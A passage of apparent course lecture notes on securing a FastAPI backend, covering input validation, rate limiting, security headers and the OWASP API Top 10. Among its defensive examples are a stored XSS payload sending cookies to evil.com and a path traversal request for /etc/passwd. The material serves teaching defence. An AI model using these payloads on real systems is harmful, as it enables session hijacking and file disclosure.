# PART 4: INPUT VALIDATION AS SECURITY

## 4.1 Never Trust the Client

> "Every piece of data that arrives at your API is a potential weapon. The JSON body, query parameters, path parameters, headers — ALL of it is controlled by the client. And the client might be an attacker."

```
┌─────────────────────────────────────────────────────────────────┐
│                   TRUST BOUNDARIES                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│                                                                 │
│    ┌─────────────────────────────────────────────────────┐      │
│    │              YOUR SERVER (trusted zone)              │      │
│    │                                                     │      │
│    │   Database results    ✅ You wrote the queries      │      │
│    │   Config values       ✅ You set them               │      │
│    │   Internal function   ✅ You wrote the code         │      │
│    │   results                                           │      │
│    │                                                     │      │
│    │  ─ ─ ─ ─ ─ ─ TRUST BOUNDARY ─ ─ ─ ─ ─ ─ ─ ─ ─    │      │
│    │                                                     │      │
│    │   Request body        ❌ Controlled by client       │      │
│    │   Query parameters    ❌ Controlled by client       │      │
│    │   Path parameters     ❌ Controlled by client       │      │
│    │   Headers             ❌ Controlled by client       │      │
│    │   Cookies             ❌ Controlled by client       │      │
│    │   Uploaded files      ❌ Controlled by client       │      │
│    │                                                     │      │
│    └─────────────────────────────────────────────────────┘      │
│                                                                 │
│    EVERYTHING below the trust boundary must be VALIDATED        │
│    before you use it. No exceptions.                            │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**The bank analogy:**

> "A bank teller does NOT blindly process whatever a customer writes on a form. They check: Is the amount reasonable? Is the account number valid? Is the signature real? Does this form look tampered with? Your API's Pydantic models are the teller checking every field."

---

## 4.2 Pydantic as Your Security Guard

**Connection to Week 3:** Your Pydantic models already do security work. Let's make them do MORE.

```python
from pydantic import BaseModel, Field, field_validator
import re

# ❌ WEAK: Minimal validation
class WeakTaskCreate(BaseModel):
    title: str
    description: str


# ✅ STRONG: Security-conscious validation
class TaskCreate(BaseModel):
    title: str = Field(
        min_length=1,
        max_length=200,       # Prevent absurdly long titles
    )
    description: str = Field(
        max_length=5000,      # Cap description length
        default="",
    )
    priority: int = Field(
        ge=1,                 # Greater than or equal to 1
        le=5,                 # Less than or equal to 5
    )

    @field_validator("title")
    @classmethod
    def title_must_be_meaningful(cls, v: str) -> str:
        stripped = v.strip()
        if not stripped:
            raise ValueError("Title cannot be only whitespace")
        return stripped
```

**What Pydantic blocks automatically:**

```
┌─────────────────────────────────────────────────────────────────┐
│           PYDANTIC'S AUTOMATIC SECURITY                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ATTACK                        │  PYDANTIC BLOCKS IT           │
│  ──────────────────────────────│───────────────────────         │
│  Send priority: 999999         │  ge=1, le=5 → 422 error       │
│  Send title: null              │  str required → 422 error     │
│  Send priority: "not_a_number" │  int type → 422 error         │
│  Send unknown_field: "hack"    │  Extra fields ignored/rejected │
│  Send nested: {deep: {deep:... │  Model shape enforced          │
│  Send role: "admin" (in create)│  Field not in model → ignored  │
│                                                                 │
│  Pydantic gives you TYPE safety + CONSTRAINT safety             │
│  for free, on every single request, before your code runs.      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 4.3 Beyond Type Checking (Security-Focused Validation)

**Type checking is the floor, not the ceiling. Attackers send valid TYPES with malicious VALUES.**

```python
from pydantic import BaseModel, Field, field_validator, model_validator
import re
import bleach  # pip install bleach (HTML sanitization library)

class UserCreate(BaseModel):
    email: str = Field(max_length=254)  # RFC 5321 max email length
    username: str = Field(min_length=3, max_length=30)
    display_name: str = Field(min_length=1, max_length=100)
    bio: str = Field(max_length=500, default="")

    @field_validator("email")
    @classmethod
    def validate_email_format(cls, v: str) -> str:
        # Basic email regex — not exhaustive, but catches obvious fakes
        pattern = r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$"
        if not re.match(pattern, v):
            raise ValueError("Invalid email format")
        return v.lower().strip()

    @field_validator("username")
    @classmethod
    def validate_username(cls, v: str) -> str:
        # Only allow alphanumeric + underscore
        # Prevents: SQL fragments, HTML, path traversal characters
        if not re.match(r"^[a-zA-Z0-9_]+$", v):
            raise ValueError(
                "Username must contain only letters, numbers, and underscores"
            )
        return v

    @field_validator("display_name", "bio")
    @classmethod
    def sanitize_text(cls, v: str) -> str:
        # Strip HTML tags to prevent stored XSS
        # If someone puts <script>alert('hacked')</script> in their bio,
        # and a frontend renders it unsanitized, the script executes
        # in every user's browser who views that profile.
        return bleach.clean(v, tags=[], strip=True)
```

**Stored XSS — why text sanitization matters:**

```
┌─────────────────────────────────────────────────────────────────┐
│                   STORED XSS ATTACK                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. Attacker creates a task with this title:                    │
│     <script>document.location='https://evil.com/steal?          │
│     cookie='+document.cookie</script>                           │
│                                                                 │
│  2. Your API stores it in the database (no sanitization)        │
│                                                                 │
│  3. Another user views the task list. The frontend renders:     │
│     <h3><script>document.location=...</script></h3>             │
│                                                                 │
│  4. The script executes in the VICTIM's browser.                │
│     Their session cookie is sent to the attacker.               │
│                                                                 │
│  5. Attacker now has the victim's session.                      │
│                                                                 │
│  DEFENSE: Sanitize input BEFORE storing.                        │
│  ALSO: Frontends should escape output. But defense in depth     │
│  means the backend should sanitize too.                         │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 4.4 Dangerous Inputs You Might Not Expect

```python
# SCENARIO 1: Path Traversal
# An endpoint that serves files based on user input

# ❌ VULNERABLE: User controls the file path
@router.get("/files/{filename}")
async def get_file(filename: str):
    path = f"/app/uploads/{filename}"
    return FileResponse(path)
# Attack: GET /files/../../etc/passwd  → reads system file!

# ✅ SAFE: Validate filename, resolve and check the path
import os
from pathlib import Path

UPLOAD_DIR = Path("/app/uploads").resolve()

@router.get("/files/{filename}")
async def get_file(filename: str):
    # Reject any path separators
    if "/" in filename or "\\" in filename or ".." in filename:
        raise HTTPException(status_code=400, detail="Invalid filename")

    file_path = (UPLOAD_DIR / filename).resolve()

    # Verify the resolved path is still inside UPLOAD_DIR
    if not str(file_path).startswith(str(UPLOAD_DIR)):
        raise HTTPException(status_code=400, detail="Invalid filename")

    if not file_path.exists():
        raise HTTPException(status_code=404, detail="File not found")

    return FileResponse(file_path)
```

```python
# SCENARIO 2: Oversized Payloads (Denial of Service)
# An attacker sends a 500MB JSON body to exhaust your server's memory

# ✅ DEFENSE: Set max_length on ALL string fields
class TaskCreate(BaseModel):
    title: str = Field(max_length=200)        # Not unbounded!
    description: str = Field(max_length=5000)  # Not unbounded!

# ✅ DEFENSE: Limit request body size at the server level
# In uvicorn: --limit-max-header-size and app-level checks
# FastAPI/Starlette doesn't have a built-in body size limit,
# but you can add middleware or use a reverse proxy (nginx)
# to enforce: client_max_body_size 1m;
```

```python
# SCENARIO 3: Mass Assignment
# Attacker sends fields they shouldn't be able to set

# ❌ VULNERABLE: Accepting the same model for create and update
class User(BaseModel):
    username: str
    email: str
    role: str       # Attacker sends: {"role": "admin"}
    is_active: bool  # Attacker sends: {"is_active": true}

# ✅ SAFE: Separate models for different operations
# (You learned this in Week 3 — request vs response models)
class UserCreate(BaseModel):
    username: str = Field(min_length=3, max_length=30)
    email: str = Field(max_length=254)
    # role is NOT here — server sets it to "member" by default
    # is_active is NOT here — server sets it to True

class UserResponse(BaseModel):
    id: int
    username: str
    email: str
    role: str
    is_active: bool

    model_config = {"from_attributes": True}
```

```
┌─────────────────────────────────────────────────────────────────┐
│              INPUT VALIDATION SECURITY RULES                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. EVERY string field needs a max_length. No exceptions.       │
│                                                                 │
│  2. EVERY numeric field needs ge/le bounds.                     │
│                                                                 │
│  3. Use SEPARATE Pydantic models for create vs update           │
│     vs response. Never accept fields the user shouldn't set.    │
│                                                                 │
│  4. Sanitize text that will be stored and displayed later.      │
│                                                                 │
│  5. Validate file names, paths, and URLs. Reject ".."           │
│                                                                 │
│  6. Strip/trim whitespace on text inputs.                       │
│                                                                 │
│  7. Normalize emails to lowercase.                              │
│                                                                 │
│  8. Reject unexpected fields (Pydantic does this by default     │
│     when model_config extra = "forbid").                        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

# PART 5: RATE LIMITING AUTH ENDPOINTS

## 5.1 The Brute Force Attack

**Back to the demo from Part 1 — but now we understand what's happening:**

```
┌─────────────────────────────────────────────────────────────────┐
│                   BRUTE FORCE ATTACK                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  The attacker's script:                                         │
│                                                                 │
│   Attempt 1:  admin@company.com / password     → 401            │
│   Attempt 2:  admin@company.com / 123456       → 401            │
│   Attempt 3:  admin@company.com / admin123     → 401            │
│   Attempt 4:  admin@company.com / letmein      → 401            │
│   ...                                                           │
│   Attempt 847: admin@company.com / Winter2024! → 200 🔓        │
│                                                                 │
│   Total time: 42 seconds                                        │
│   Your server: processed all 847 attempts without blinking.     │
│                                                                 │
│                                                                 │
│  CREDENTIAL STUFFING (even worse):                              │
│  ──────────────────────────────────                             │
│  Attackers buy leaked email/password combos from data breaches. │
│  People reuse passwords across services.                        │
│                                                                 │
│   Attempt 1:  alice@gmail.com  / MyDogSpot2020  → 401           │
│   Attempt 2:  bob@yahoo.com    / P@ssw0rd!      → 200 🔓       │
│   Attempt 3:  carol@msn.com    / Summer2023     → 401           │
│   ...                                                           │
│   10,000 attempts with 3% success rate = 300 compromised users  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

> "Your bcrypt hashing from Lecture 1 means the passwords are safe in your database. But it does NOT stop an attacker from trying to log in from outside. Rate limiting is the bouncer who says: 'You've tried 5 times and failed. Come back in 15 minutes.'"

---

## 5.2 Why Auth Endpoints Are Special Targets

```
┌─────────────────────────────────────────────────────────────────┐
│           WHY AUTH ENDPOINTS NEED EXTRA PROTECTION              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. UNAUTHENTICATED: Anyone can hit /login without a token.     │
│     Your JWT + RBAC from Lectures 2-3 can't protect this        │
│     endpoint — it IS the authentication endpoint.               │
│                                                                 │
│  2. HIGH VALUE: A successful guess gives full account access.    │
│                                                                 │
│  3. PREDICTABLE: Attackers know the email format.               │
│     (firstname.lastname@company.com, from LinkedIn)             │
│                                                                 │
│  4. SILENT: Without rate limiting, the attacker gets a clean     │
│     401 response. No alarms. No lockout. No evidence.           │
│                                                                 │
│  5. SCALABLE: An attacker with 10 servers can try millions      │
│     of passwords per hour against your single /login endpoint.  │
│                                                                 │
│                                                                 │
│  ENDPOINTS TO RATE LIMIT:                                       │
│  ─────────────────────────                                      │
│  POST /auth/login          ← Most critical                      │
│  POST /auth/register       ← Prevent mass fake accounts         │
│  POST /auth/forgot-password← Prevent email bombing              │
│  POST /auth/reset-password ← Prevent token brute-force          │
│  POST /auth/refresh        ← Prevent token cycling              │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 5.3 Implementing Rate Limiting with slowapi

**slowapi is a rate-limiting library built for Starlette and FastAPI:**

```python
# Install: pip install slowapi

from fastapi import FastAPI, Request
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded
from slowapi.middleware import SlowAPIMiddleware

# Initialize the limiter
# key_func determines HOW to identify a client (by IP address here)
limiter = Limiter(key_func=get_remote_address)

app = FastAPI()

# Store limiter in app state (slowapi needs this)
app.state.limiter = limiter

# Register the error handler for rate limit violations
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

# Add the middleware that checks limits on each request
app.add_middleware(SlowAPIMiddleware)
```

**The key concept — `key_func`:**

```
┌─────────────────────────────────────────────────────────────────┐
│                    KEY FUNCTION                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  key_func answers: "WHO is making this request?"                │
│                                                                 │
│  The rate limiter tracks requests PER KEY.                      │
│  Same key = same "client" = shared rate limit.                  │
│                                                                 │
│                                                                 │
│  get_remote_address (default):                                  │
│  ──────────────────────────────                                 │
│  Identifies clients by IP address.                              │
│  192.168.1.1 gets 5 attempts. 192.168.1.2 gets 5 attempts.     │
│                                                                 │
│  Pros: Works before authentication (no token needed)            │
│  Cons: Shared IPs (corporate, VPN) punish innocent users        │
│                                                                 │
│                                                                 │
│  For LOGIN specifically, IP-based is the right choice.          │
│  The user hasn't authenticated yet — IP is all you have.        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Apply rate limits to auth endpoints:**

```python
from fastapi import APIRouter, Request, Depends
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)
router = APIRouter(prefix="/auth", tags=["auth"])


# TIGHT limit on login — most attacked endpoint
@router.post("/login")
@limiter.limit("5/minute")
async def login(
    request: Request,  # slowapi needs the Request object
    credentials: LoginRequest,
    db: AsyncSession = Depends(get_db),
):
    user = await authenticate_user(db, credentials.email, credentials.password)
    if not user:
        raise HTTPException(status_code=401, detail="Invalid credentials")
    # ... create and return tokens (Lecture 2 code)


# Moderate limit on registration
@router.post("/register")
@limiter.limit("3/minute")
async def register(
    request: Request,
    user_data: UserCreate,
    db: AsyncSession = Depends(get_db),
):
    # ... create user (Lecture 1 code)


# Tight limit on password reset (prevents email bombing)
@router.post("/forgot-password")
@limiter.limit("2/minute")
async def forgot_password(
    request: Request,
    body: ForgotPasswordRequest,
):
    # ... send reset email
    # ALWAYS return 200 even if email doesn't exist
    # (don't reveal which emails are registered)
    return {"message": "If that email exists, a reset link was sent."}
```

**IMPORTANT: `Request` parameter requirement:**

```python
# slowapi requires the Request object to extract the client's IP.
# It must be named "request" (or "Request") in the function signature.

# ❌ WRONG: No request parameter — slowapi can't identify the client
@router.post("/login")
@limiter.limit("5/minute")
async def login(credentials: LoginRequest):
    ...

# ✅ CORRECT: Request parameter present
@router.post("/login")
@limiter.limit("5/minute")
async def login(request: Request, credentials: LoginRequest):
    ...
```

**Rate limit string syntax:**

```
┌─────────────────────────────────────────────────────────────────┐
│                RATE LIMIT SYNTAX                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  "5/minute"           │  5 requests per minute                  │
│  "100/hour"           │  100 requests per hour                  │
│  "1000/day"           │  1000 requests per day                  │
│  "1/second"           │  1 request per second                   │
│  "5/minute;100/hour"  │  BOTH limits apply (5/min AND 100/hr)   │
│                                                                 │
│                                                                 │
│  RECOMMENDED LIMITS FOR AUTH:                                   │
│  ────────────────────────────                                   │
│  Login:          "5/minute;20/hour"                              │
│  Register:       "3/minute;10/hour"                              │
│  Forgot password: "2/minute;5/hour"                              │
│  Token refresh:  "10/minute"                                     │
│                                                                 │
│  For regular API endpoints (authenticated):                     │
│  General:        "60/minute" (or set as default_limits)          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 5.4 Rate Limit Headers and Custom Responses

**When rate limited, the client should know WHY and WHEN to retry:**

```python
from starlette.requests import Request
from starlette.responses import JSONResponse
from slowapi.errors import RateLimitExceeded


# Custom handler with structured JSON response
@app.exception_handler(RateLimitExceeded)
async def custom_rate_limit_handler(
    request: Request,
    exc: RateLimitExceeded,
) -> JSONResponse:
    return JSONResponse(
        status_code=429,
        content={
            "error": "rate_limit_exceeded",
            "message": "Too many requests. Please slow down.",
            "retry_after": exc.detail,  # When the limit resets
        },
        headers={
            "Retry-After": str(exc.detail),  # Standard HTTP header
        },
    )
```

**Enable rate limit headers on all responses:**

```python
# Tell clients their remaining quota on EVERY response
limiter = Limiter(
    key_func=get_remote_address,
    headers_enabled=True,  # Adds X-RateLimit headers
)
```

**The response headers clients see:**

```
HTTP/1.1 200 OK
X-RateLimit-Limit: 5         ← Your maximum per window
X-RateLimit-Remaining: 3     ← How many you have left
X-RateLimit-Reset: 1706889600← Unix timestamp when limit resets

--- After exceeding the limit: ---

HTTP/1.1 429 Too Many Requests
Retry-After: 45               ← Seconds to wait
X-RateLimit-Limit: 5
X-RateLimit-Remaining: 0
X-RateLimit-Reset: 1706889600
Content-Type: application/json

{
    "error": "rate_limit_exceeded",
    "message": "Too many requests. Please slow down.",
    "retry_after": "45"
}
```

**Now re-run the brute force attack:**

```
Attempt 1: 401 Unauthorized (X-RateLimit-Remaining: 4)
Attempt 2: 401 Unauthorized (X-RateLimit-Remaining: 3)
Attempt 3: 401 Unauthorized (X-RateLimit-Remaining: 2)
Attempt 4: 401 Unauthorized (X-RateLimit-Remaining: 1)
Attempt 5: 401 Unauthorized (X-RateLimit-Remaining: 0)
Attempt 6: 429 Too Many Requests (Retry-After: 58)
Attempt 7: 429 Too Many Requests (Retry-After: 57)
...

Attacker: 5 guesses per minute instead of 5000.
At this rate, 10 million passwords = 1,388 DAYS. 🛡️
```

**Important caveat:**

```
┌─────────────────────────────────────────────────────────────────┐
│              RATE LIMITING LIMITATIONS                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  IP-based rate limiting is NOT bulletproof:                      │
│                                                                 │
│  • Distributed attacks: Attacker uses 1000 IPs (botnet)         │
│    → Each IP gets 5 attempts = 5000 total per minute            │
│                                                                 │
│  • VPN/Proxy rotation: Attacker switches IPs constantly         │
│                                                                 │
│  • Shared IPs: Corporate offices share one IP                   │
│    → Legitimate users get locked out together                   │
│                                                                 │
│                                                                 │
│  ADDITIONAL DEFENSES (combine, don't replace):                  │
│  ─────────────────────────────────────────────                  │
│  • Account lockout after N failed attempts per EMAIL            │
│  • Progressive delays (1s, 2s, 4s, 8s... between attempts)     │
│  • CAPTCHA after 3 failed login attempts                        │
│  • Monitor for distributed patterns (same password, many IPs)  │
│  • Geo-blocking (if your users are all in one country)          │
│                                                                 │
│  Today we implement the foundation. In Week 10 (Redis),         │
│  you'll learn distributed rate limiting that works across       │
│  multiple server instances.                                     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

# PART 6: SECURITY HEADERS — THE BUILDING CODES

## 6.1 What Are Security Headers?

> "When your bank was built, it had to follow building codes: fire exits, sprinkler systems, reinforced vault doors. These codes don't stop a specific robbery — they reduce the BLAST RADIUS when something goes wrong. Security headers are building codes for your API."

```
┌─────────────────────────────────────────────────────────────────┐
│               WHAT ARE SECURITY HEADERS?                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Security headers are HTTP response headers that INSTRUCT       │
│  the browser on how to behave when handling your content.       │
│                                                                 │
│  They say things like:                                          │
│  • "Don't guess the content type — I'm telling you it's JSON"  │
│  • "Don't let anyone embed my page in an iframe"                │
│  • "Always use HTTPS when talking to me"                        │
│  • "Don't send referrer information to other sites"             │
│                                                                 │
│  The browser OBEYS these headers (if it supports them).         │
│                                                                 │
│  Without them, browsers use DEFAULTS — and the defaults         │
│  are often permissive in ways that help attackers.              │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 6.2 Essential Headers for APIs

```
┌─────────────────────────────────────────────────────────────────┐
│              SECURITY HEADERS EXPLAINED                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  HEADER                          WHAT IT DOES                   │
│  ──────────────────────────────  ────────────────────────────── │
│                                                                 │
│  X-Content-Type-Options: nosniff                                │
│  ─────────────────────────────── ──────────────────────────     │
│  Problem: Browsers sometimes "guess" the content type.          │
│  If you return JSON but the browser guesses HTML, it might      │
│  execute JavaScript embedded in your JSON values.               │
│  Fix: "nosniff" says "Trust MY Content-Type, don't guess."      │
│                                                                 │
│                                                                 │
│  X-Frame-Options: DENY                                          │
│  ─────────────────────────────── ──────────────────────────     │
│  Problem: An attacker embeds your API response in an invisible  │
│  iframe on their page. They trick users into clicking buttons   │
│  that actually interact with YOUR API (clickjacking).           │
│  Fix: "DENY" says "Never put my content in an iframe."          │
│                                                                 │
│                                                                 │
│  Strict-Transport-Security: max-age=31536000                    │
│  ─────────────────────────────── ──────────────────────────     │
│  Problem: User accidentally visits http:// instead of https://  │
│  An attacker on the same Wi-Fi intercepts the unencrypted       │
│  traffic (man-in-the-middle attack).                            │
│  Fix: After first HTTPS visit, browser FORCES https for 1 year. │
│  (Only set this if you ARE running HTTPS in production.)        │
│                                                                 │
│                                                                 │
│  Cache-Control: no-store                                        │
│  ─────────────────────────────── ──────────────────────────     │
│  Problem: Browser caches an API response containing sensitive   │
│  data (user profiles, tokens). The next user on a shared        │
│  computer sees cached data without logging in.                  │
│  Fix: "no-store" says "Never save this response anywhere."      │
│  (Apply to sensitive endpoints — not necessarily all.)           │
│                                                                 │
│                                                                 │
│  Content-Security-Policy: default-src 'none';                   │
│    frame-ancestors 'none'                                       │
│  ─────────────────────────────── ──────────────────────────     │
│  Problem: If an attacker somehow injects HTML into your API     │
│  response, the browser might load external scripts.             │
│  Fix: "default-src 'none'" = "Don't load ANYTHING that I        │
│  didn't explicitly list." frame-ancestors 'none' is the         │
│  modern replacement for X-Frame-Options.                        │
│                                                                 │
│                                                                 │
│  Referrer-Policy: strict-origin-when-cross-origin               │
│  ─────────────────────────────── ──────────────────────────     │
│  Problem: When a browser follows a link from your site to       │
│  another, it sends the full URL as the "Referrer" header.       │
│  This can leak sensitive info from query params.                │
│  Fix: Only send the origin (domain), not the full URL path.     │
│                                                                 │
│                                                                 │
│  Permissions-Policy: geolocation=(), camera=(), microphone=()   │
│  ─────────────────────────────── ──────────────────────────     │
│  Problem: If an attacker embeds your content, they might try    │
│  to access browser features (camera, location) in your context. │
│  Fix: Explicitly disable all browser features you don't need.   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 6.3 Custom Security Headers Middleware

**Connection to Week 3:** You learned that middleware wraps every request/response. We're adding a middleware layer that stamps security headers onto EVERY response your API sends.

```python
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.requests import Request
from starlette.responses import Response


class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    """Add security headers to every response."""

    async def dispatch(self, request: Request, call_next) -> Response:
        response = await call_next(request)

        # Prevent MIME-type sniffing
        response.headers["X-Content-Type-Options"] = "nosniff"

        # Prevent clickjacking (iframe embedding)
        response.headers["X-Frame-Options"] = "DENY"

        # Modern clickjacking prevention (CSP)
        response.headers["Content-Security-Policy"] = (
            "default-src 'none'; frame-ancestors 'none'"
        )

        # Disable legacy XSS filter (can cause more harm than good)
        # Modern apps should rely on CSP instead
        response.headers["X-XSS-Protection"] = "0"

        # Control referrer information leakage
        response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"

        # Disable unnecessary browser features
        response.headers["Permissions-Policy"] = (
            "geolocation=(), camera=(), microphone=()"
        )

        # Force HTTPS (only add in production with HTTPS configured)
        # response.headers["Strict-Transport-Security"] = (
        #     "max-age=31536000; includeSubDomains"
        # )

        return response


# Register it
app.add_middleware(SecurityHeadersMiddleware)
```

**Per-endpoint cache control for sensitive data:**

```python
# Not all endpoints need Cache-Control: no-store.
# Public data (product listings) CAN be cached.
# Sensitive data (user profiles, auth) must NOT be cached.

@router.get("/users/me")
async def get_current_user_profile(
    current_user: User = Depends(get_current_user),
):
    # This response contains PII — don't cache
    return Response(
        content=current_user.model_dump_json(),
        media_type="application/json",
        headers={"Cache-Control": "no-store"},
    )


# OR: Create a dependency that adds the header (cleaner)
async def no_cache_headers(response: Response):
    response.headers["Cache-Control"] = "no-store"

@router.get(
    "/users/me",
    dependencies=[Depends(no_cache_headers)],
)
async def get_current_user_profile(
    current_user: User = Depends(get_current_user),
):
    return current_user
```

**Verify your headers — quick test:**

```python
# In your terminal:
# curl -I http://localhost:8000/tasks

# You should see:
# HTTP/1.1 200 OK
# x-content-type-options: nosniff
# x-frame-options: DENY
# content-security-policy: default-src 'none'; frame-ancestors 'none'
# x-xss-protection: 0
# referrer-policy: strict-origin-when-cross-origin
# permissions-policy: geolocation=(), camera=(), microphone=()
```

---

# PART 7: OWASP API SECURITY TOP 10 — KNOW YOUR ENEMY

## 7.1 What is OWASP?

> "The FBI publishes 'Most Wanted' lists so law enforcement knows who to look for. OWASP does the same thing for software security."

OWASP — the Open Web Application Security Project — is a non-profit organization whose goal is to promote web application security. OWASP offers many free resources for building a more secure web application.[[7]](https://www.cloudflare.com/learning/security/api/owasp-api-security-top-10/)

APIs are a critical part of modern mobile, SaaS and web applications and can be found in customer-facing, partner-facing and internal applications. By nature, APIs expose application logic and sensitive data such as Personally Identifiable Information (PII), and because of this have increasingly become a target for attackers.[[2]](https://owasp.org/www-project-api-security/)

OWASP released its updated list of Top 10 API Security Vulnerabilities in 2023.[[8]](https://apisecurity.io/owasp-api-security-top-10/) This is the definitive reference for what goes wrong with API security in the real world.

---

## 7.2 The API Security Top 10 (Mapped to What You Know)

**Here's the power of this lecture: you've already covered most of this list. Let's connect the dots.**

```
┌─────────────────────────────────────────────────────────────────┐
│          OWASP API SECURITY TOP 10 (2023)                      │
│          MAPPED TO YOUR COURSE KNOWLEDGE                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  #   RISK                         YOU LEARNED IT IN...          │
│  ─── ─────────────────────────── ─────────────────────────────  │
│                                                                 │
│  1   Broken Object Level          Week 9 Lecture 3 (RBAC)       │
│      Authorization (BOLA)         Check: does THIS user own     │
│                                   THIS task before returning    │
│                                   it? Don't just check role —   │
│                                   check OWNERSHIP.              │
│                                                                 │
│  2   Broken Authentication        Week 9 Lectures 1-2           │
│                                   (bcrypt, JWT, refresh tokens) │
│                                   + TODAY (rate limiting)       │
│                                                                 │
│  3   Broken Object Property       Week 3 (Pydantic)             │
│      Level Authorization          Separate request/response     │
│                                   models. Never return password │
│                                   hashes. Never accept "role"   │
│                                   in a create request.          │
│                                                                 │
│  4   Unrestricted Resource        TODAY (rate limiting,          │
│      Consumption                  input validation, max_length) │
│                                   + Week 4 (pagination)         │
│                                                                 │
│  5   Broken Function Level        Week 9 Lecture 3              │
│      Authorization                (admin-only endpoints,        │
│                                   role-checking dependencies)   │
│                                                                 │
│  6   Unrestricted Access to       TODAY (rate limiting on        │
│      Sensitive Business Flows     sensitive endpoints)           │
│                                                                 │
│  7   Server-Side Request          Week 8 (external APIs)         │
│      Forgery (SSRF)               Validate URLs before          │
│                                   your server fetches them.     │
│                                   Never let user input control  │
│                                   where your server makes       │
│                                   HTTP requests to.             │
│                                                                 │
│  8   Security Misconfiguration    TODAY (CORS, security          │
│                                   headers, debug mode off)      │
│                                                                 │
│  9   Improper Inventory           Week 4 (API versioning,        │
│      Management                   OpenAPI documentation)        │
│                                   Know which endpoints exist.   │
│                                   Deprecate old versions.       │
│                                                                 │
│  10  Unsafe Consumption of        Week 8 (external API           │
│      APIs                         validation with Pydantic,     │
│                                   never trust external data)    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

> "Look at that. Ten API security risks, and you've touched EVERY SINGLE ONE in this course. Security isn't a separate skill — it's woven into every week you've studied. The question is: will you remember to apply it?"

---

### The #1 Risk: BOLA (Broken Object Level Authorization)

BOLA is represented in about 40% of all API attacks and is the most common API security threat.[[3]](https://salt.security/blog/owasp-api-security-top-10-explained) It deserves special attention.

```python
# The scenario: User A tries to access User B's task

# ❌ VULNERABLE: Only checks authentication, not ownership
@router.get("/tasks/{task_id}")
async def get_task(
    task_id: int,
    current_user: User = Depends(get_current_user),  # Authenticated? ✅
    db: AsyncSession = Depends(get_db),
):
    task = await db.get(Task, task_id)
    if not task:
        raise HTTPException(status_code=404)
    return task  # But does this user OWN this task? 🚨 NOT CHECKED


# ✅ SAFE: Checks authentication AND ownership
@router.get("/tasks/{task_id}")
async def get_task(
    task_id: int,
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db),
):
    # Query scoped to current user's tasks
    stmt = (
        select(Task)
        .where(Task.id == task_id)
        .where(Task.owner_id == current_user.id)  # ← OWNERSHIP CHECK
    )
    result = await db.execute(stmt)
    task = result.scalar_one_or_none()

    if not task:
        # Return 404, NOT 403
        # (don't reveal that the task EXISTS but belongs to someone else)
        raise HTTPException(status_code=404, detail="Task not found")

    return task
```

**Why return 404 instead of 403?**

```
┌─────────────────────────────────────────────────────────────────┐
│                  404 vs 403 STRATEGY                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  403 Forbidden:    "This task exists, but you can't see it."    │
│                    → Attacker learns: task ID 42 EXISTS.        │
│                    → They now know valid IDs to target.         │
│                                                                 │
│  404 Not Found:    "Task not found."                            │
│                    → Attacker doesn't know if ID 42 exists      │
│                       or if they just can't see it.             │
│                    → No information leaked.                     │
│                                                                 │
│  For RESOURCES that belong to users:                            │
│  Use 404 when access is denied. Reveal nothing.                 │
│                                                                 │
│  For ACTIONS (e.g., admin panel):                               │
│  Use 403. The user knows the page exists but needs permission.  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 7.3 Your Security Checklist

```
┌─────────────────────────────────────────────────────────────────┐
│           API SECURITY CHECKLIST                               │
│           (Print this. Pin it to your wall.)                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  AUTHENTICATION & AUTHORIZATION                                 │
│  □ Passwords hashed with bcrypt (Lecture 1)                     │
│  □ JWT with short-lived access + rotating refresh (Lecture 2)   │
│  □ RBAC on all endpoints (Lecture 3)                            │
│  □ Object-level ownership checks (BOLA prevention)             │
│  □ Separate request/response Pydantic models (no mass assign)  │
│                                                                 │
│  TRANSPORT & BROWSER SECURITY                                   │
│  □ CORS configured with explicit origins (no wildcard in prod)  │
│  □ Security headers middleware active                           │
│  □ HTTPS in production (Strict-Transport-Security)              │
│  □ Sensitive responses: Cache-Control: no-store                 │
│                                                                 │
│  INPUT & QUERY SAFETY                                           │
│  □ All string fields have max_length                            │
│  □ All numeric fields have ge/le bounds                         │
│  □ Text inputs sanitized (strip HTML/scripts)                   │
│  □ File paths validated (no ".." traversal)                     │
│  □ SQL: ORM or parameterized queries ONLY (no f-strings!)       │
│                                                                 │
│  RATE LIMITING & ABUSE PREVENTION                               │
│  □ Login endpoint rate limited (5/minute)                       │
│  □ Registration rate limited (3/minute)                         │
